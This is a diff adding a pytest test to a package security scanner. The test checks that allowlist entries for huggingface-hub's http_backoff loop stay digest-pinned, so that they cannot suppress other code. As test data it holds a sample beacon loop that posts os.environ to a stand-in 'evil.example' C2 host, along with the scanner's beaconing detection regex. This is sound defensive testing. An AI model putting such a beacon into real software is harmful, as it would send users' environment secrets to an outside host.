@@ -447,6 +447,102 @@ def test_annotation_only_network_entries_are_digest_pinned():
     assert seen == credential_adjacent, f"missing entries for {credential_adjacent - seen}"
 
 
+def test_the_hf_backoff_suppression_is_narrow():
+    """The huggingface-hub `http_backoff` allowlist must not cover a second loop.
+
+    Security audit went red on every main commit from fc325f431 onward with one
+    un-baselined CRITICAL, "C2 polling/beaconing loop detected" in
+    huggingface_hub/utils/_http.py. No repo commit caused it: the resolved
+    huggingface-hub moved off the 0.x line, and 1.26.1, 1.27.0 and 1.28.0 all carry
+    the loop while 0.36.2 does not.
+
+    It is `http_backoff`: a bounded retry that counts `nb_tries` against
+    `max_retries`, sleeps with exponential backoff between attempts, and raises
+    once the budget is spent. RE_C2_POLLING is `while True .* sleep .* requests\.`
+    under re.DOTALL, so it cannot tell that shape apart from a real beacon, which
+    is why the file is allowlisted rather than the check weakened.
+
+    This file now carries four entries for the same check -- L298, L461, L462 and
+    L461 again -- one per revision of that loop that huggingface-hub has shipped.
+    That is the mechanism working as designed, not drift: the key is digest-pinned,
+    so every edit to the loop reopens the finding and asks for a fresh review. The
+    cost is that a hub release touching those thirty lines turns Security audit red
+    until someone looks. Worth knowing before treating the next one as a break.
+
+    Allowlisting a CRITICAL in a file that already speaks HTTP is the part worth
+    guarding. Each entry has to keep suppressing exactly the loop it was reviewed
+    against, so a payload appended to the same file and check reopens the finding
+    rather than inheriting the suppression.
+    """
+    import json
+    import pathlib as _pathlib
+
+    baseline = json.loads(
+        (
+            _pathlib.Path(__file__).resolve().parents[2] / "scripts" / "scan_packages_baseline.json"
+        ).read_text(encoding = "utf-8")
+    )
+    entries = [
+        e
+        for e in baseline["entries"]
+        if e.get("package") == "huggingface-hub"
+        and e.get("file") == "huggingface_hub/utils/_http.py"
+        and e.get("check") == "C2 polling/beaconing loop detected"
+    ]
+    assert entries, "http_backoff is no longer allowlisted; Security audit is red"
+
+    # Digest-pinned, not line-pinned: each evidence carries the sha256 of the span it
+    # was reviewed against, which is what makes an edit to the loop reopen the
+    # finding instead of riding the old entry.
+    for entry in entries:
+        assert "sha256:" in entry["evidence"], (
+            f"{entry['evidence_hash'][:12]} is not pinned to reviewed code, so any "
+            f"while-True loop in this file would inherit its suppression"
+        )
+        assert entry.get(
+            "evidence_hash"
+        ), "no evidence_hash: _load_baseline would recompute it as a legacy entry"
+    hashes = [e["evidence_hash"] for e in entries]
+    assert len(set(hashes)) == len(hashes), "duplicate entries for the same reviewed span"
+
+    # The blast radius. A beaconing loop appended to the same file, under the same
+    # check, must produce a different key.
+    reviewed_src = (
+        "import time\n"
+        "import requests\n"
+        "def http_backoff():\n"
+        "    while True:\n"
+        "        r = requests.get(url)\n"
+        "        if nb_tries > max_retries:\n"
+        "            raise err\n"
+        "        time.sleep(sleep_time)\n"
+    )
+    payload_src = reviewed_src + (
+        "def beacon():\n"
+        "    while True:\n"
+        "        requests.post('https://evil.example/c2', data=os.environ)\n"
+        "        time.sleep(30)\n"
+    )
+    reviewed = _mk(
+        sp.CRITICAL,
+        "huggingface-hub",
+        "huggingface_hub/utils/_http.py",
+        "C2 polling/beaconing loop detected",
+        sp._extract_evidence(reviewed_src, sp.RE_C2_POLLING),
+    )
+    payload = _mk(
+        sp.CRITICAL,
+        "huggingface-hub",
+        "huggingface_hub/utils/_http.py",
+        "C2 polling/beaconing loop detected",
+        sp._extract_evidence(payload_src, sp.RE_C2_POLLING),
+    )
+    assert sp._finding_key(reviewed) != sp._finding_key(payload), (
+        "a beaconing loop appended to _http.py keeps the reviewed key, so the "
+        "http_backoff allowlist would suppress it too"
+    )
+
+
 def test_network_check_sees_httpx2():
     """httpx2 is a separate import name, not a submodule of httpx.
 
